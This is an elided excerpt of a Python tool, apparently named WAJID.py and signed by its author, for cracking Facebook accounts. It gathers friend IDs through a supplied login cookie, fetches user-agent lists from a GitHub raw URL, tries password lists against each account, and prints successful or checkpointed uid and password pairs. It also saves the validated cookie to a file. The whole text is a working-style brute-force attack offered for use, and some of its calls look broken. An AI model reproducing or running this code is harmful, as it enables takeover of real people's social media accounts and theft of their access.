...
|__/     \__/|__/  |__/ \______/ |______/|_______/ 
 ...
 --------------------------------------------------
  ...
  Github   : https://github.com/Sy3dwajid

  facebook: Abdul wajid
...
--------------------------------------------------
  ...
  this msg for heaters : F33l Me B4By
...
def main():
    ...
    if option =='1':
        ...
        os.system('rm -rf .chrome.txt .android.txt && python WAJID.py')
    ...
    for fir in range(limit_user):
        ...
        try:
            ...
            if 'invalid' in str(fr):
                ...
                print('  Logged cookie has expired ...')
        ...
        try:
           ...
           # print('  Total friends: '+str(len(uids)))
            ...
            if 'invalid' in str(rg):
                ...
                print('  cookie has expired, try again ...')
...
def crack():
    ...
    shivali = requests.get('https://raw.githubusercontent.com/abdulwajid/ua/main/'+uachoice+'.txt').text.splitlines()
...
def mbasic(uid,pwx,shivali):
    ...
    try:
        ...
        for ps in pwx:
            ...
            get_cookie = session.cookie.get_dict().keys()

            if 'c_user' in get_cookie:

                print('\033[1;32m  [Successful-WAJID] '+uid+' | '+ps+'\033[0;97m')
                ...
                print('\033[1;31m  [Checkpoint-WAJID] '+uid+' | '+ps+'\033[0;97m')
...
def login():
    ...
    try:
        ...
        u = requests.get('https://graph.facebook.com/me?access_cookie='+cookie).text

        u1 = json.loads(u)

        name = u1['name']

        ts = open('access_ cookie.txt', 'w')
        ...
        print('\n  successful cookie provided, try again  ')
